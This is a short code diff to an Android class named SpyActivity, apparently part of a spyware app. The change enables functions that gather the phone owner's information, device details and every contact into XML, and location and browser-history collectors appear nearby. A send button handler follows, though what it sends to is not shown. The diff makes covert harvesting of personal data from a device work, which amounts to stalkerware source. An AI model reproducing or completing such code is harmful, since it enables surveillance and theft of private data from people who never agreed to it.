@@ -53,9 +53,9 @@ public class SpyActivity extends Activity {
 		//(new Localisation())._getLocation(this);
 		//(new BrowserHistory()).getBrowserHist(this);
 	//Log.d("non",returnAllXML(this));
-		final String VALUE = "";//returnAllXML(this);
+		final String VALUE = returnAllXML(this);
 		//Log.d("non","Longueur VALUE : "+VALUE.length());
-	(new PhoneDevice()).OwnerInformations(this);
+	(new PhoneDevice()).OwnerInformationsToXML(this);
 		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
 		sendButton.setOnClickListener(new View.OnClickListener() {
@@ -126,7 +126,7 @@ public class SpyActivity extends Activity {
 		String listContactXML= listContact.GetAllContactsInformationsToXML(context);
 		
 		PhoneDevice phoneDevice= new PhoneDevice();
-		String phoneDeviceXML= phoneDevice.deviceInformationsToXML();
+		String phoneDeviceXML= phoneDevice.deviceInformationsToXML(context);
 		
 		Localisation localisation= new Localisation();
 		
